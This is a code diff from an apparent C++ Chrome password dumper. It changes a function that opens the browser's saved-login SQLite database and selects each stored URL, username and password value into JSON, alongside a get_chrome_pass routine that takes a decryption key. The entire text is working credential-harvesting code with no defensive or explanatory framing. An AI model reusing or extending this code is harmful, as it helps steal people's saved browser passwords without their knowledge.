@@ -86,7 +86,19 @@ std::stringstream get_chrome_pass(BYTE *key, sqlite3* db)
     return dump;
 }
 
-json getAllResults(sqlite3* db){
+json getAllResults(const char * temp){
+
+   sqlite3 *db;
+   int db_res;
+    //https://www.tutorialspoint.com/sqlite/sqlite_c_cpp.htm
+   db_res = sqlite3_open(temp, &db);
+
+   if( db_res ) {
+      fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
+      return(0);
+   } else {
+      fprintf(stderr, "Opened database successfully\n");
+   }
     std::vector<json> data;
     std::string sql = "SELECT origin_url, username_value, password_value FROM logins";
 
@@ -105,7 +117,7 @@ json getAllResults(sqlite3* db){
     while (rc == SQLITE_ROW) 
     {
         json temp;
-        printf("IN RC row\n");
+        //printf("IN RC row\n");
         temp["url"] = (char*)sqlite3_column_text(pStmt, 0);
         //const char * a= sqlite3_column_blob(pStmt, 2);
         
@@ -156,6 +168,7 @@ json getAllResults(sqlite3* db){
         data.push_back(temp);
     }
     rc = sqlite3_finalize(pStmt);
+    sqlite3_close(db);
     return data;
 
 }
